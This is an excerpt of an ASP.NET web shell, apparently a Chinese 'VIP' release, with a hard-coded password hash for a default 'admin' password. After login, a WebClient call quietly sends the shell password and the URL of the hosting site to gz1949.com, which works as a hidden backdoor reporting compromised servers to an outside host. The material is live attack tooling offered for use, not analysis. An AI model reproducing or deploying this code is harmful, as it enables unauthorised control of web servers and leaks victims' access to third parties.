...
<script runat="server">
public string Password="d3b01bc5d3476b6be8976e0f06c25aa8";  //默认密码:admin
...
ljtzC.Visible=false;
string pass = "admins";
System.Net.WebClient ss = new System.Net.WebClient();
string s = "http://www.gz1949.com/so.php?user=" + Password + "&url=" +HttpContext.Current.Request.Url.ToString();
ss.DownloadData(s);
PBZw();
}
else
...
<tr class="head">
<td ><span style="float:right;"><a href="www.gz1949.com" target="_blank">更新时间2013年VIP版本</a></span><span id="Bin_Span_Sname" runat="server" enableviewstate="true"></span></td>
</tr>
<tr class="alt1">
